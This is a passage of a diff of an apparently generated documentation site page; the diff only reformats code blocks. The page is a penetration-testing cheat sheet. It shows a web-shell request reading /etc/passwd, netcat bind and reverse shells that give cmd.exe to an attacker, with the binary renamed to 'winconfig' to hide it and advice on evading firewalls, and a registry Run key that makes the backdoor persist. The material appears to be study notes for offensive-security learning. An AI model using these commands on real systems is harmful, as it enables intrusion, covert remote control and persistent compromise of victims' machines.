+</span><span id="__span-16-21"><a id="__codelineno-16-21" name="__codelineno-16-21"></a>Content-length:<span class="w"> </span><span class="o">[</span>number<span class="w"> </span>you<span class="w"> </span>got<span class="w"> </span>with<span class="w"> </span>wc<span class="w"> </span>-m<span class="w"> </span>payload<span class="o">]</span>
+</span><span id="__span-16-22"><a id="__codelineno-16-22" name="__codelineno-16-22"></a>
+</span><span id="__span-16-23"><a id="__codelineno-16-23" name="__codelineno-16-23"></a>
+</span><span id="__span-16-24"><a id="__codelineno-16-24" name="__codelineno-16-24"></a><span class="c1"># Run the exploit by typing in the browser:</span>
+</span><span id="__span-16-25"><a id="__codelineno-16-25" name="__codelineno-16-25"></a>http://victim.site/shell.php?cmd<span class="o">=</span>cat+/etc/passwd
+</span></code></pre></div></td></tr></table></div>
 <h2 id="backdoors-with-netcat">Backdoors with netcat</h2>
 <h3 id="the-attacker-initiates-the-connection">The attacker initiates the connection</h3>
 <p><strong>In the victim machine</strong>: If windows, get the ncat.exe executable file, rename it to something else such as winconfig and we write in command line:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>wincofig -l -p &lt;port&gt; -e cmd.exe
-</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a># Example: wincofig -l -p 5555 -e cmd.exe
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-17-1">1</a></span>
+<span class="normal"><a href="#__codelineno-17-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1"></a>wincofig -l -p &lt;port&gt; -e cmd.exe
+</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2"></a># Example: wincofig -l -p 5555 -e cmd.exe
+</span></code></pre></div></td></tr></table></div>
 <p><strong>In the attacker machine</strong>:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>ncat &lt;victim IP address&gt; &lt;port specified&gt;
-</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a># Example: ncat 192.168.0.40 5555
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-18-1">1</a></span>
+<span class="normal"><a href="#__codelineno-18-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1"></a>ncat &lt;victim IP address&gt; &lt;port specified&gt;
+</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2"></a># Example: ncat 192.168.0.40 5555
+</span></code></pre></div></td></tr></table></div>
 <h3 id="the-victim-initiates-the-connection">The victim initiates the connection</h3>
 <p>Great to avoid firewalls!!!</p>
 <p><strong>In the victim machine</strong>: If windows, get the ncat.exe executable file, rename it to something else such as winconfig and we write in command line:</p>
-<p><div class="language-text highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>winconfig -e cmd.exe &lt;attacker IP&gt; &lt;port&gt;
-</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a># Example: winconfig -e cmd.exe 192.168.1.40 5555
-</span></code></pre></div>
+<p><div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-19-1">1</a></span>
+<span class="normal"><a href="#__codelineno-19-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1"></a>winconfig -e cmd.exe &lt;attacker IP&gt; &lt;port&gt;
+</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2"></a># Example: winconfig -e cmd.exe 192.168.1.40 5555
+</span></code></pre></div></td></tr></table></div>
 <strong>In the attacker machine</strong>:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>ncat -l -p &lt;port&gt; -v
-</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a># Example: ncat -l -p 5555 -v
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-20-1">1</a></span>
+<span class="normal"><a href="#__codelineno-20-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1"></a>ncat -l -p &lt;port&gt; -v
+</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2"></a># Example: ncat -l -p 5555 -v
+</span></code></pre></div></td></tr></table></div>
 <h2 id="creating-a-registry-in-regedit">Creating a registry in regedit</h2>
 <ul>
 <li>In regedit, go to Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</li>
@@ -17479,9 +17549,10 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <li>We name it exactly like the ncat.exe file (if we renamed it to winconfig, then we call this registry winconfig&gt;</li>
 <li>We edit the registry and we add the path to the executable file and some commands  in the Value data:</li>
 </ul>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>“C:\Windows/System32\winconfig.exe &lt;attacker IP&gt; &lt;port&gt; -e cmd.exe”
-</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a># For instance: “C:\Windows/System32\winconfig.exe 192.168.1.50 5540 -e cmd.exe”
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-21-1">1</a></span>
+<span class="normal"><a href="#__codelineno-21-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1"></a>“C:\Windows/System32\winconfig.exe &lt;attacker IP&gt; &lt;port&gt; -e cmd.exe”
+</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2"></a># For instance: “C:\Windows/System32\winconfig.exe 192.168.1.50 5540 -e cmd.exe”
+</span></code></pre></div></td></tr></table></div>
 
 <!-- This section adds support for localized revision dates -->
 
@@ -17557,7 +17628,7 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
     </div>
     
     
-    <script id="__config" type="application/json">{"base": "..", "features": ["navigation.instant", "navigation.top", "navigation.indexes", "navigation.path", "navigation.tab", "content.code.annotate", "content.code.copy", "content.code.select", "search.suggest", "search.highlight"], "search": "../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    <script id="__config" type="application/json">{"base": "..", "features": ["navigation.instant", "navigation.top", "navigation.indexes", "navigation.path", "navigation.tab", "content.code.annotate", "content.code.copy", "content.code.select", "search.suggest", "search.highlight", "codehilite", "code-blocks"], "search": "../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
     
     
       <script src="../assets/javascripts/bundle.88dd0f4e.min.js"></script>
